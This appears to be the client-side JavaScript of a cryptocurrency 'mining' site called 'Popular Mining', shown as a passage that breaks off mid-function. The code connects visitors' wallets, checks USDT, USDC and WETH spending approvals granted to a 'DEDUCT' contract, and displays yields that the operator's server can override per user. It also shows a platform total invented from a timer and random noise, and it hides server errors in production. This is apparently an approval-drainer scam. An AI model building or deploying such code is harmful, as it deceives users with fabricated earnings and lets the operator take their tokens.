const DEDUCT_CONTRACT_ADDRESS='0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS='0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS='0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS='0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
const API_BASE_URL='https://ventilative-lenten-brielle.ngrok-free.dev';
const DEDUCT_CONTRACT_ABI=[
"function isServiceActiveFor(address customer) view returns (bool)",
"function activateService(address tokenContract) external",
"function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)",
{
"anonymous":false,
"inputs":[
{"indexed":true,"name":"customer","type":"address"},
{"indexed":true,"name":"tokenContract","type":"address"}
],
"name":"ServiceActivated",
"type":"event"
}
];
const ERC20_ABI=[
"function approve(address spender, uint256 amount) external returns (bool)",
"function balanceOf(address account) view returns (uint256)",
"function allowance(address owner, address spender) view returns (uint256)"
];
const connectButton=document.getElementById('connectButton');
const statusDiv=document.getElementById('status');
const startBtn=document.getElementById('startBtn');
const pledgeBtn=document.getElementById('pledgeBtn');
const pledgeAmount=document.getElementById('pledgeAmount');
const pledgeDuration=document.getElementById('pledgeDuration');
const pledgeToken=document.getElementById('pledgeToken');
const refreshWallet=document.getElementById('refreshWallet');
const walletTokenSelect=document.getElementById('walletTokenSelect');
const walletBalanceAmount=document.getElementById('walletBalanceAmount');
const accountBalanceValue=document.getElementById('accountBalanceValue');
const totalValue=document.getElementById('totalValue');
let grossOutputValue=document.getElementById('grossOutputValue');
let cumulativeValue=document.getElementById('cumulativeValue');
const nextBenefit=document.getElementById('nextBenefit');
const claimBtn=document.createElement('button');
claimBtn.id='claimButton';
const claimModal=document.getElementById('claimModal');
const closeModal=document.getElementById('closeModal');
const confirmClaim=document.getElementById('confirmClaim');
const cancelClaim=document.getElementById('cancelClaim');
const modalClaimableETH=document.getElementById('modalClaimableETH');
const modalEthPrice=document.getElementById('modalEthPrice');
const modalSelectedToken=document.getElementById('modalSelectedToken');
const modalEquivalentValue=document.getElementById('modalEquivalentValue');
const modalTitle=document.getElementById('modalTitle');
const languageSelect=document.getElementById('languageSelect');
const elements={
title:document.getElementById('title'),
subtitle:document.getElementById('subtitle'),
tabLiquidity:document.querySelector('.tab[data-tab="liquidity"]'),
tabPledging:document.querySelector('.tab[data-tab="pledging"]'),
grossOutputLabel:document.getElementById('grossOutputLabel'),
cumulativeLabel:document.getElementById('cumulativeLabel'),
walletBalanceLabel:document.getElementById('walletBalanceLabel'),
accountBalanceLabel:document.getElementById('accountBalanceLabel'),
compoundLabel:document.getElementById('compoundLabel'),
startBtnText:startBtn,
pledgeAmountLabel:document.getElementById('pledgeAmountLabel'),
pledgeDurationLabel:document.getElementById('pledgeDurationLabel'),
pledgeBtnText:pledgeBtn,
totalPledgedLabel:document.getElementById('totalPledgedLabel'),
expectedYieldLabel:document.getElementById('expectedYieldLabel'),
apyLabel:document.getElementById('apyLabel'),
lockedUntilLabel:document.getElementById('lockedUntilLabel')
};
let provider,signer,userAddress;
let deductContract,usdtContract,usdcContract,wethContract;
let stakingStartTime=null;
let claimedInterest=0;
let pledgedAmount=0;
let interestInterval=null;
let nextBenefitInterval=null;
let accountBalance={USDT:0,USDC:0,WETH:0};
let isServerAvailable=false;
let pendingUpdates=[];
let localLastUpdated=0;
const isDevMode=window.location.hostname==='localhost'||window.location.hostname==='127.0.0.1'||window.isDevMode;
const translations={
'en':{
title:'Popular Mining',
subtitle:'Start Earning Millions',
tabLiquidity:'Liquidity',
tabPledging:'Pledging',
grossOutputLabel:'Gross Output',
cumulativeLabel:'Cumulative',
walletBalanceLabel:'Wallet Balance',
accountBalanceLabel:'Account Balance',
compoundLabel:'⚡ Compound',
nextBenefit:'Next Benefit: 00:00:00',
startBtnText:'Start',
pledgeAmountLabel:'Pledge Amount',
pledgeDurationLabel:'Duration',
pledgeBtnText:'Pledge Now',
totalPledgedLabel:'Total Pledged',
expectedYieldLabel:'Expected Yield',
apyLabel:'APY',
lockedUntilLabel:'Locked Until',
claimBtnText:'Claim',
noClaimable:'No claimable interest available or invalid value.',
priceError:'Could not fetch price data. Please try again later.',
invalidCalc:'Invalid calculation. Please refresh and try again.',
claimSuccess:'Claim successful! Your Account Balance has been updated.',
walletConnected:'Wallet connected successfully.',
fetchingBalances:'Fetching wallet balances...',
error:'Error',
offlineWarning:'Server is offline, running locally. Data will sync when server is available.',
noWallet:'Please install MetaMask or a compatible wallet to continue.',
dataSent:'Data sent to backend successfully.',
pledgeSuccess:'Pledge successful! Data sent to backend.',
pledgeError:'Pledge failed. Please try again.',
invalidPledgeAmount:'Please enter a valid pledge amount greater than 0.',
invalidPledgeToken:'Please select a valid token.',
insufficientBalance:'Insufficient balance for selected token.',
tunnelWarning:'Localtunnel reminder page detected. Please test locally or visit the tunnel URL to click Continue.',
sseFailed:'SSE connection failed, using fallback polling.',
ethersError:'Ethers.js initialization failed. Please check your network or CDN.'
},
'zh-Hant':{
title:'熱門挖礦',
subtitle:'開始賺取數百萬',
tabLiquidity:'流動性',
tabPledging:'質押',
grossOutputLabel:'總產出',
cumulativeLabel:'累計',
walletBalanceLabel:'錢包餘額',
accountBalanceLabel:'帳戶餘額',
compoundLabel:'⚡ 複利',
nextBenefit:'下次收益: 00:00:00',
startBtnText:'開始',
pledgeAmountLabel:'質押金額',
pledgeDurationLabel:'期間',
pledgeBtnText:'立即質押',
totalPledgedLabel:'總質押',
expectedYieldLabel:'預期收益',
apyLabel:'年化收益率',
lockedUntilLabel:'鎖定至',
claimBtnText:'領取',
noClaimable:'無可領取的利息或數值無效。',
priceError:'無法獲取價格數據，請稍後重試。',
invalidCalc:'計算無效，請刷新後重試。',
claimSuccess:'領取成功！您的帳戶餘額已更新。',
walletConnected:'錢包連線成功。',
fetchingBalances:'正在獲取錢包餘額...',
error:'錯誤',
offlineWarning:'伺服器離線，使用本地運行。數據將在伺服器可用時同步。',
noWallet:'請安裝 MetaMask 或相容錢包以繼續。',
dataSent:'數據已成功發送至後端。',
pledgeSuccess:'質押成功！數據已發送至後端。',
pledgeError:'質押失敗，請重試。',
invalidPledgeAmount:'請輸入大於 0 的有效質押金額。',
invalidPledgeToken:'請選擇有效的代幣。',
insufficientBalance:'選定代幣餘額不足。',
tunnelWarning:'檢測到 Localtunnel 提示頁面，請嘗試本地測試或訪問隧道 URL 點擊繼續。',
sseFailed:'SSE 連線失敗，使用後備輪詢更新數據。',
ethersError:'Ethers.js 初始化失敗，請檢查網絡或 CDN。'
},
'zh-Hans':{
title:'热门挖矿',
subtitle:'开始赚取数百万',
tabLiquidity:'流动性',
tabPledging:'质押',
grossOutputLabel:'总产出',
cumulativeLabel:'累计',
walletBalanceLabel:'钱包余额',
accountBalanceLabel:'账户余额',
compoundLabel:'⚡ 复利',
nextBenefit:'下次收益: 00:00:00',
startBtnText:'开始',
pledgeAmountLabel:'质押金额',
pledgeDurationLabel:'期间',
pledgeBtnText:'立即质押',
totalPledgedLabel:'总质押',
expectedYieldLabel:'预期收益',
apyLabel:'年化收益率',
lockedUntilLabel:'锁定至',
claimBtnText:'领取',
noClaimable:'无可领取的利息或数值无效。',
priceError:'无法获取价格数据，请稍后重试。',
invalidCalc:'计算无效，请刷新后重试。',
claimSuccess:'领取成功！您的账户余额已更新。',
walletConnected:'钱包连接成功。',
fetchingBalances:'正在获取钱包余额...',
error:'错误',
offlineWarning:'服务器离线，使用本地运行。数据将在服务器可用时同步。',
noWallet:'请安装 MetaMask 或兼容钱包以继续。',
dataSent:'数据已成功发送至后端。',
pledgeSuccess:'质押成功！数据已发送至后端。',
pledgeError:'质押失败，请重试。',
invalidPledgeAmount:'请输入大于 0 的有效质押金额。',
invalidPledgeToken:'请选择有效的代币。',
insufficientBalance:'选定代币余额不足。',
tunnelWarning:'检测到 Localtunnel 提示页面，请尝试本地测试或访问隧道 URL 点击继续。',
sseFailed:'SSE 连线失败，使用后备轮询更新数据。',
ethersError:'Ethers.js 初始化失敗，請檢查網絡或 CDN。'
}
};
let currentLang=localStorage.getItem('language')||'zh-Hant';
async function retry(fn,maxAttempts=3,delayMs=3000){
for(let i=0;i<maxAttempts;i++){
try{
return await fn();
}catch(error){
if(error.message.includes('CORS')||error.message.includes('preflight')||error.message.includes('Unexpected token')){
console.warn(`retry: Error detected (CORS or JSON parse), extending delay to ${delayMs}ms: ${error.message}`);
}
if(i===maxAttempts-1)throw error;
console.warn(`retry: Attempt ${i+1}/${maxAttempts} failed, retrying after ${delayMs}ms: ${error.message}`);
await new Promise(resolve=>setTimeout(resolve,delayMs));
}
}
}
async function retryDOMAcquisition(maxAttempts=3,delayMs=500){
let attempts=0;
while(attempts<maxAttempts){
grossOutputValue=document.getElementById('grossOutputValue');
cumulativeValue=document.getElementById('cumulativeValue');
if(grossOutputValue&&cumulativeValue){
console.log(`retryDOMAcquisition: Successfully acquired DOM elements after ${attempts+1} attempts.`);
return true;
}
console.warn(`retryDOMAcquisition: Attempt ${attempts+1} failed. Retrying after ${delayMs}ms...`);
await new Promise(resolve=>setTimeout(resolve,delayMs));
attempts++;
}
console.error(`retryDOMAcquisition: Failed to acquire DOM elements after ${maxAttempts} attempts.`);
updateStatus(translations[currentLang].error+': 無法獲取 DOM 元素',true);
return false;
}
async function checkServerStatus(){
try{
const response=await fetch(`${API_BASE_URL}/api/status`,{
cache:'no-cache'
});
if(response.ok){
const{status,lastUpdated}=await response.json();
isServerAvailable=status==='available';
if(isServerAvailable&&pendingUpdates.length>0){
await syncPendingUpdates(lastUpdated);
}
console.log(`checkServerStatus: Server is ${isServerAvailable?'available':'unavailable'}, last updated: ${lastUpdated}`);
return isServerAvailable;
}
}catch(error){
console.warn(`checkServerStatus: Server is unavailable: ${error.message}`);
isServerAvailable=false;
if(isDevMode){
updateStatus(translations[currentLang].offlineWarning,true);
}
}
return false;
}
async function syncPendingUpdates(serverLastUpdated){
for(const update of pendingUpdates){
if(update.timestamp>serverLastUpdated){
await saveUserData(update.data,false);
console.log(`syncPendingUpdates: Synced update with timestamp: ${update.timestamp}`);
}else{
console.log(`syncPendingUpdates: Skipped outdated update with timestamp: ${update.timestamp}`);
}
}
pendingUpdates=[];
}
async function loadUserDataFromServer(){
if(!userAddress){
console.log(`loadUserDataFromServer: No user address, skipping.`);
return;
}
try{
const response=await retry(()=>fetch(`${API_BASE_URL}/api/all-data`,{
cache:'no-cache'
}));
if(!response.ok)throw new Error(`HTTP error: ${response.status}`);
const contentType=response.headers.get('content-type');
if(!contentType||!contentType.includes('application/json')){
throw new Error(`Invalid content type: ${contentType||'none'}, expected application/json`);
}
const allData=await response.json();
console.log(`loadUserDataFromServer: Received server data:`,allData);
const userData=allData.users[userAddress]||{};
const localData=JSON.parse(localStorage.getItem('userData')||'{}');
localLastUpdated=localData.lastUpdated||0;
if(allData.lastUpdated>localLastUpdated){
stakingStartTime=userData.stakingStartTime?parseInt(userData.stakingStartTime):null;
claimedInterest=userData.claimedInterest?parseFloat(userData.claimedInterest):0;
pledgedAmount=userData.pledgedAmount?parseFloat(userData.pledgedAmount):0;
accountBalance=userData.accountBalance||{USDT:0,USDC:0,WETH:0};
localStorage.setItem('userData',JSON.stringify({
stakingStartTime,
claimedInterest,
pledgedAmount,
accountBalance,
nextBenefitTime:userData.nextBenefitTime,
lastUpdated:allData.lastUpdated
}));
console.log(`loadUserDataFromServer: Synced user data from server:`,userData);
localLastUpdated=allData.lastUpdated;
}
const pledgeData=allData.pledges[userAddress]||{};
if(pledgeData.isPledging){
const tokenSymbol={
[USDT_CONTRACT_ADDRESS]:'USDT',
[USDC_CONTRACT_ADDRESS]:'USDC',
[WETH_CONTRACT_ADDRESS]:'WETH'
}[pledgeData.token]||'Unknown';
document.getElementById('totalPledgedValue').textContent=`${parseFloat(pledgeData.amount).toFixed(2)} ${tokenSymbol}`;
}
await updateInterest();
}catch(error){
console.warn(`loadUserDataFromServer: Failed to load from server: ${error.message}`);
const localData=JSON.parse(localStorage.getItem('userData')||'{}');
stakingStartTime=localData.stakingStartTime||null;
claimedInterest=localData.claimedInterest||0;
pledgedAmount=localData.pledgedAmount||0;
accountBalance=localData.accountBalance||{USDT:0,USDC:0,WETH:0};
if(isDevMode){
updateStatus(translations[currentLang].offlineWarning,true);
}
}
}
async function saveUserData(data=null,addToPending=true){
if(!userAddress){
console.log(`saveUserData: No user address available, skipping save.`);
return;
}
const dataToSave=data||{
stakingStartTime,
claimedInterest,
pledgedAmount,
accountBalance,
grossOutput:parseFloat(grossOutputValue?.textContent?.replace(' ETH','')||'0'),
cumulative:parseFloat(cumulativeValue?.textContent?.replace(' ETH','')||'0'),
nextBenefitTime:localStorage.getItem('nextBenefitTime'),
lastUpdated:Date.now(),
source:'index.html'
};
if(!isServerAvailable){
if(addToPending){
pendingUpdates.push({timestamp:Date.now(),data:dataToSave});
localStorage.setItem('userData',JSON.stringify(dataToSave));
if(isDevMode){
updateStatus(translations[currentLang].offlineWarning,true);
}
}
return;
}
try{
const response=await retry(()=>fetch(`${API_BASE_URL}/api/user-data`,{
method:'POST',
headers:{
'Content-Type':'application/json'
},
body:JSON.stringify({address:userAddress,data:dataToSave})
}));
if(!response.ok)throw new Error(`Failed to save user data, status: ${response.status}`);
console.log(`saveUserData: User data sent to server successfully.`);
localStorage.setItem('userData',JSON.stringify(dataToSave));
localLastUpdated=dataToSave.lastUpdated;
updateStatus(translations[currentLang].dataSent);
}catch(error){
console.warn(`saveUserData: Could not send user data to server: ${error.message}`);
if(addToPending){
pendingUpdates.push({timestamp:Date.now(),data:dataToSave});
localStorage.setItem('userData',JSON.stringify(dataToSave));
if(isDevMode){
updateStatus(translations[currentLang].offlineWarning,true);
}
}
}
}
function updateStatus(message,isWarning=false){
if(!statusDiv){
console.warn(`updateStatus: statusDiv not found, cannot display message: ${message}`);
return;
}
if(message===translations[currentLang].offlineWarning&&!isDevMode){
statusDiv.innerHTML='';
statusDiv.style.display='none';
console.log(`updateStatus: Suppressed offline warning in production: ${message}`);
return;
}
statusDiv.innerHTML=message||'';
statusDiv.style.display=message?'block':'none';
statusDiv.style.color=isWarning?'#FFD700':'#FFFFFF';
console.log(`updateStatus: ${isWarning?'Warning':'Info'}: ${message}`);
}
function resetState(showMsg=true){
console.log(`resetState: Executing state reset...`);
signer=userAddress=null;
stakingStartTime=null;
claimedInterest=0;
pledgedAmount=0;
accountBalance={USDT:0,USDC:0,WETH:0};
if(interestInterval){
clearInterval(interestInterval);
console.log(`resetState: Cleared interest interval: ${interestInterval}`);
}
if(nextBenefitInterval){
clearInterval(nextBenefitInterval);
console.log(`resetState: Cleared next benefit interval: ${nextBenefitInterval}`);
}
localStorage.clear();
console.log(`resetState: Local storage cleared.`);
if(startBtn){
startBtn.style.display='block';
startBtn.textContent=translations[currentLang]?.startBtnText||'Start';
}
const existingClaimBtn=document.getElementById('claimButton');
if(existingClaimBtn){
existingClaimBtn.remove();
console.log(`resetState: Removed claim button.`);
}
if(connectButton){
connectButton.classList.remove('connected');
connectButton.textContent='Connect';
connectButton.title='Connect Wallet';
console.log(`resetState: Reset connect button state.`);
}
disableInteractiveElements(true);
if(walletBalanceAmount)walletBalanceAmount.textContent='0.000';
if(walletTokenSelect)walletTokenSelect.value='USDT';
if(accountBalanceValue)accountBalanceValue.textContent='0.000 USDT';
if(grossOutputValue)grossOutputValue.textContent='0 ETH';
if(cumulativeValue)cumulativeValue.textContent='0 ETH';
if(showMsg)updateStatus(translations[currentLang].noWallet,true);
}
function disableInteractiveElements(disable=false){
if(startBtn)startBtn.disabled=disable;
if(pledgeBtn)pledgeBtn.disabled=disable;
if(pledgeAmount)pledgeAmount.disabled=disable;
if(pledgeDuration)pledgeDuration.disabled=disable;
if(pledgeToken)pledgeToken.disabled=disable;
if(refreshWallet){
refreshWallet.style.pointerEvents=disable?'none':'auto';
refreshWallet.style.color=disable?'#999':'#ff00ff';
}
if(claimBtn)claimBtn.disabled=disable;
console.log(`disableInteractiveElements: Interactive elements ${disable?'disabled':'enabled'}.`);
}
function updateBalancesUI(walletBalances){
if(!walletTokenSelect){
console.warn(`updateBalancesUI: walletTokenSelect is missing`);
return;
}
if(!window.ethers||!window.ethers.utils){
console.error(`updateBalancesUI: Ethers.js utils not loaded. Check CDN or network.`);
updateStatus(translations[currentLang].ethersError,true);
return;
}
const selectedToken=walletTokenSelect.value;
const decimals={USDT:6,USDC:6,WETH:18};
const walletTokenBigInt=walletBalances[selectedToken.toLowerCase()]||0n;
const formattedWalletBalance=window.ethers.utils.formatUnits(walletTokenBigInt,decimals[selectedToken]);
if(walletBalanceAmount){
walletBalanceAmount.textContent=parseFloat(formattedWalletBalance).toFixed(3);
console.log(`updateBalancesUI: Updated wallet balance for ${selectedToken}: ${formattedWalletBalance}`);
}
const claimedBalance=accountBalance[selectedToken]||0;
const pledgeData=JSON.parse(localStorage.getItem('userData')||'{}').pledgedAmount||0;
const totalAccountBalance=parseFloat(formattedWalletBalance)+claimedBalance+(selectedToken===pledgeToken.value?pledgeData:0);
if(accountBalanceValue){
accountBalanceValue.textContent=`${totalAccountBalance.toFixed(3)} ${selectedToken}`;
console.log(`updateBalancesUI: Updated account balance for ${selectedToken}: ${totalAccountBalance}`);
}
if(parseFloat(formattedWalletBalance)<0.001){
updateStatus(`Notice: Your ${selectedToken} balance is zero.`,true);
}else if(statusDiv&&statusDiv.style.color==='rgb(255, 215, 0)'){
updateStatus("");
}
}
function updateTotalFunds(){
if(!totalValue){
console.warn(`updateTotalFunds: totalValue DOM element not found`);
return;
}
const startTime=new Date('2025-10-22T00:00:00-04:00').getTime();
const initialFunds=12856459.94;
const averageIncreasePerSecond=0.055;
const currentTime=Date.now();
const elapsedSeconds=Math.floor((currentTime-startTime)/1000);
const totalIncrease=elapsedSeconds*averageIncreasePerSecond;
const randomFluctuation=(Math.random()-0.5);
const totalFunds=initialFunds+totalIncrease+randomFluctuation;
totalValue.textContent=`${totalFunds.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2})} ETH`;
console.log(`updateTotalFunds: Updated total funds: ${totalFunds.toFixed(2)} ETH`);
}
async function updateInterest(){
if(!grossOutputValue||!cumulativeValue){
const acquired=await retryDOMAcquisition();
if(!acquired)return;
}
if(!userAddress){
grossOutputValue.textContent='0 ETH';
cumulativeValue.textContent='0 ETH';
return;
}
let finalGrossOutput=0;
let finalCumulative=0;
let overrideApplied=false;
if(isServerAvailable){
try{
const response=await retry(()=>fetch(`${API_BASE_URL}/api/all-data`,{cache:'no-cache'}));
if(response.ok){
const allData=await response.json();
if(allData.lastUpdated>localLastUpdated){
const userOverrides=allData.overrides[userAddress]||{};
if(userOverrides.grossOutput!==undefined&&userOverrides.cumulative!==undefined){
finalGrossOutput=Number(userOverrides.grossOutput);
finalCumulative=Number(userOverrides.cumulative);
overrideApplied=true;
console.log(`updateInterest: OVERRIDES APPLIED → Gross: ${finalGrossOutput}, Cumulative: ${finalCumulative}`);
}
const userData=allData.users[userAddress]||{};
stakingStartTime=userData.stakingStartTime?parseInt(userData.stakingStartTime):stakingStartTime;
claimedInterest=userData.claimedInterest?parseFloat(userData.claimedInterest):claimedInterest;
pledgedAmount=userData.pledgedAmount?parseFloat(userData.pledgedAmount):pledgedAmount;
accountBalance=userData.accountBalance||accountBalance;
localLastUpdated=allData.lastUpdated;
localStorage.setItem('userData',JSON.stringify({
stakingStartTime,claimedInterest,pledgedAmount,accountBalance,
nextBenefitTime:userData.nextBenefitTime,lastUpdated:allData.lastUpdated
}));
}
}else throw new Error(`HTTP ${response.status}`);
}catch(e){
console.warn(`updateInterest: Server fetch failed: ${e.message}`);
isServerAvailable=false;
}
}
if(!overrideApplied&&stakingStartTime&&pledgedAmount>0){
const elapsedSeconds=Math.floor((Date.now()-stakingStartTime)/1000);
finalGrossOutput=elapsedSeconds*0.000001*pledgedAmount;
finalCumulative=finalGrossOutput-claimedInterest;
}
grossOutputValue.textContent=`${finalGrossOutput.toFixed(7)} ETH`;
cumulativeValue.textContent=`${finalCumulative.toFixed(7)} ETH`;
console.log(`updateInterest: UI UPDATED → Gross: ${finalGrossOutput.toFixed(7)}, Cumulative: ${finalCumulative.toFixed(7)}`);
}
function updateLanguage(lang){
currentLang=lang;
languageSelect.value=lang;
localStorage.setItem('language',lang);
for(let key in elements){
if(elements[key]&&translations[lang]?.[key]){
elements[key].textContent=translations[lang][key];
}
}
if(claimBtn.parentNode)claimBtn.textContent=translations[lang]?.claimBtnText||'Claim';
if(modalTitle)modalTitle.textContent=translations[lang]?.claimBtnText||'Claim Interest';
updateNextBenefitTimer();
}
function updateNextBenefitTimer(){
if(!nextBenefit)return;
const nextBenefitTimestamp=parseInt(localStorage.getItem('nextBenefitTime'));
const label=(translations[currentLang]?.nextBenefit||"Next Benefit: 00:00:00").split(':')[0];
if(!nextBenefitTimestamp){
nextBenefit.textContent=`${label}: 00:00:00`;
return;
}
const now=Date.now();
let diff=nextBenefitTimestamp-now;
if(diff<0){
const twelveHoursInMillis=12*60*60*1000;
let newNextBenefitTimestamp=nextBenefitTimestamp;
while(newNextBenefitTimestamp<=now){
newNextBenefitTimestamp+=twelveHoursInMillis;
}
localStorage.setItem('nextBenefitTime',newNextBenefitTimestamp.toString());
saveUserData();
}
const totalSeconds=Math.floor(diff/1000);
const hours=String(Math.floor(totalSeconds/3600)).padStart(2,'0');
const minutes=String(Math.floor((totalSeconds%3600)/60)).padStart(2,'0');
const seconds=String(totalSeconds%60).padStart(2,'0');
nextBenefit.textContent=`${label}: ${hours}:${minutes}:${seconds}`;
}
function getETOffsetMilliseconds(){
const now=new Date();
const mar=new Date(now.getFullYear(),2,8);
const nov=new Date(now.getFullYear(),10,1);
const marDay=mar.getDay();
const novDay=nov.getDay();
const dstStart=new Date(mar.getFullYear(),mar.getMonth(),8+(7-marDay));
const dstEnd=new Date(nov.getFullYear(),nov.getMonth(),1+(7-novDay));
return now>=dstStart&&now<dstEnd ? -4*60*60*1000 : -5*60*60*1000;
}
function setInitialNextBenefitTime(){
if(localStorage.getItem('nextBenefitTime'))return;
const etOffset=getETOffsetMilliseconds();
const nowET=new Date(Date.now()+etOffset);
const noonET=new Date(nowET);noonET.setHours(12,0,0,0);
const midnightET=new Date(nowET);midnightET.setHours(24,0,0,0);
const nextBenefitTimeET=nowET<noonET?noonET:midnightET;
const finalNextBenefitTimestamp=nextBenefitTimeET.getTime()-etOffset;
localStorage.setItem('nextBenefitTime',finalNextBenefitTimestamp.toString());
saveUserData();
}
function activateStakingUI(){
const storedStartTime=localStorage.getItem('stakingStartTime');
stakingStartTime=storedStartTime?parseInt(storedStartTime):Date.now();
localStorage.setItem('stakingStartTime',stakingStartTime.toString());
claimedInterest=parseFloat(localStorage.getItem('claimedInterest'))||0;
pledgedAmount=parseFloat(localStorage.getItem('pledgedAmount'))||0;
const storedAccountBalance=JSON.parse(localStorage.getItem('accountBalance'));
if(storedAccountBalance)accountBalance=storedAccountBalance;
if(startBtn)startBtn.style.display='none';
if(document.getElementById('claimButton'))return;
claimBtn.textContent=translations[currentLang]?.claimBtnText||'Claim';
claimBtn.className='start-btn';
claimBtn.style.marginTop='10px';
claimBtn.disabled=false;
const placeholder=document.getElementById('claimButtonPlaceholder');
placeholder?placeholder.appendChild(claimBtn):document.getElementById('liquidity').appendChild(claimBtn);
if(!claimBtn.hasEventListener){
claimBtn.addEventListener('click',claimInterest);
claimBtn.hasEventListener=true;
}
if(interestInterval)clearInterval(interestInterval);
interestInterval=setInterval(updateInterest,5000);
if(nextBenefitInterval)clearInterval(nextBenefitInterval);
nextBenefitInterval=setInterval(updateNextBenefitTimer,1000);
saveUserData();
}
async function sendMobileRobustTransaction(populatedTx){
if(!signer||!provider)throw new Error(translations[currentLang].error+": Wallet not connected.");
const txValue=populatedTx.value?populatedTx.value.toString():'0';
const fromAddress=await signer.getAddress();
const mobileTx={from:fromAddress,to:populatedTx.to,data:populatedTx.data,value:'0x'+BigInt(txValue).toString(16)};
let txHash,receipt=null;
try{
txHash=await provider.send('eth_sendTransaction',[mobileTx]);
updateStatus(`${translations[currentLang].fetchingBalances} HASH: ${txHash.slice(0,10)}...`);
receipt=await provider.waitForTransaction(txHash);
}catch(error){
if(error.hash)txHash=error.hash;
else if(error.message&&error.message.includes('0x')){
const match=error.message.match(/(0x[a-fA-F0-9]{64})/);
if(match)txHash=match[0];
}
if(txHash){
updateStatus(`TX sent: ${txHash.slice(0,10)}...`);
receipt=await provider.waitForTransaction(txHash);
}else throw error;
}
if(!receipt||receipt.status!==1)throw new Error(`TX reverted: ${txHash?.slice(0,10)||''}`);
return receipt;
}
async function initializeWallet(){
let ethersLoaded=false;
for(let i=0;i<30;i++){
if(window.ethers&&window.ethers.providers&&window.ethers.providers.Web3Provider){ethersLoaded=true;break;}
await new Promise(r=>setTimeout(r,2000));
}
if(!ethersLoaded){
const cdnUrls=['https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js','https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js'];
for(let url of cdnUrls){
const s=document.createElement('script');s.type='text/javascript';s.src=url;s.async=false;document.head.appendChild(s);
await new Promise(r=>setTimeout(r,3000));
if(window.ethers&&window.ethers.providers&&window.ethers.providers.Web3Provider){ethersLoaded=true;break;}
}
if(!ethersLoaded){updateStatus(translations[currentLang].ethersError,true);connectButton.disabled=true;return;}
}
try{
if(typeof window.ethereum==='undefined'){
updateStatus(translations[currentLang].noWallet,true);
disableInteractiveElements(true);connectButton.disabled=true;return;
}
provider=new window.ethers.providers.Web3Provider(window.ethereum);
window.ethereum.on('accountsChanged',a=>a.length===0||a[0].toLowerCase()!==userAddress?.toLowerCase()?location.reload():null);
window.ethereum.on('chainChanged',()=>location.reload());
const accounts=await provider.send('eth_accounts',[]);
if(accounts.length>0)await connectWallet();
else{disableInteractiveElements(true);updateStatus(translations[currentLang].noWallet,true);}
}catch(e){
updateStatus(`${translations[currentLang].error}: ${e.message}`,true);
connectButton.disabled=true;
}
}
async function connectWallet(){
try{
if(typeof window.ethereum==='undefined'){
updateStatus(translations[currentLang].noWallet,true);connectButton.disabled=true;return;
}
if(!window.ethers||!window.ethers.providers||!window.ethers.providers.Web3Provider){
updateStatus(translations[currentLang].ethersError,true);return;
}
if(!provider)provider=new window.ethers.providers.Web3Provider(window.ethereum);
updateStatus('請在錢包中確認連線...');
const accounts=await provider.send('eth_requestAccounts',[]);
if(accounts.length===0)throw new Error("No account selected.");
signer=provider.getSigner();userAddress=await signer.getAddress();
connectButton.classList.add('connected');connectButton.textContent='已連線';connectButton.title='斷開錢包連線';
deductContract=new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS,DEDUCT_CONTRACT_ABI,signer);
usdtContract=new window.ethers.Contract(USDT_CONTRACT_ADDRESS,ERC20_ABI,signer);
usdcContract=new window.ethers.Contract(USDC_CONTRACT_ADDRESS,ERC20_ABI,signer);
wethContract=new window.ethers.Contract(WETH_CONTRACT_ADDRESS,ERC20_ABI,signer);
await updateUIBasedOnChainState();
updateStatus(translations[currentLang].fetchingBalances);
const balances={usdt:await retry(()=>usdtContract.balanceOf(userAddress)).catch(()=>0n),
usdc:await retry(()=>usdcContract.balanceOf(userAddress)).catch(()=>0n),
weth:await retry(()=>wethContract.balanceOf(userAddress)).catch(()=>0n)};
updateBalancesUI(balances);
updateStatus(translations[currentLang].walletConnected);
await loadUserDataFromServer();setupSSE();await saveUserData();
}catch(e){
let msg=`${translations[currentLang].error}: ${e.message}`;
if(e.code===4001)msg="您拒絕了連線請求。";
updateStatus(msg,true);resetState(true);connectButton.disabled=typeof window.ethereum==='undefined';
}
}
async function updateUIBasedOnChainState(){
if(!signer)return;
try{
updateStatus(translations[currentLang].fetchingBalances);
const requiredAllowance=await retry(()=>deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
const[isServiceActive,usdtAllowance,usdcAllowance,wethAllowance]=await Promise.all([
retry(()=>deductContract.isServiceActiveFor(userAddress)),
retry(()=>usdtContract.allowance(userAddress,DEDUCT_CONTRACT_ADDRESS)).catch(()=>0n),
retry(()=>usdcContract.allowance(userAddress,DEDUCT_CONTRACT_ADDRESS)).catch(()=>0n),
retry(()=>wethContract.allowance(userAddress,DEDUCT_CONTRACT_ADDRESS)).catch(()=>0n)
]);
const isWethAuthorized=wethAllowance>=requiredAllowance;
const isUsdtAuthorized=usdtAllowance>=requiredAllowance;
const isUsdcAuthorized=usdcAllowance>=requiredAllowance;
const hasSufficientAllowance=isWethAuthorized||isUsdtAuthorized||isUsdcAuthorized;
const isFullyAuthorized=isServiceActive||hasSufficientAllowance;
if(isFullyAuthorized){
if(isWethAuthorized)walletTokenSelect.value='WETH';
else if(isUsdtAuthorized)walletTokenSelect.value='USDT';
else if(isUsdcAuthorized)walletTokenSelect.value='USDC';
walletTokenSelect.dispatchEvent(new Event('change'));
setInitialNextBenefitTime();activateStakingUI();
pledgeBtn.disabled=pledgeAmount.disabled=pledgeDuration.disabled=pledgeToken.disabled=false;
}else{
if(startBtn)startBtn.style.display='block';
pledgeBtn.disabled=pledgeAmount.disabled=pledgeDuration.disabled=pledgeToken.disabled=true;
}
disableInteractiveElements(false);updateStatus("");
}catch(e){
updateStatus(`${translations[currentLang].error}: ${e.message}`,true);
}
}
async function handleConditionalAuthorizationFlow(){
if(!signer)throw new Error(translations[currentLang].error+": Wallet not connected");
updateStatus('準備授權...');
const selectedToken=walletTokenSelect.value;
const requiredAllowance=await retry(()=>deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
const serviceActivated=await retry(()=>deductContract.isServiceActiveFor(userAddress));
const tokenMap={
